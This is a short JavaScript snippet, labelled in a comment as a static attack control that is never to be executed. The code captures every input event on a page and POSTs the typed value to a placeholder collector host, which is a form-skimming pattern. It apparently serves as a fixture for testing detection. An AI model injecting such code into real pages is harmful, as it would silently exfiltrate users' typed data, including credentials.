// Static attack control: never execute. The endpoint is reserved.
document.addEventListener('input', function(event) {
  fetch('https://collector.example.invalid/record', {
    method: 'POST', body: event.target.value
  });
});
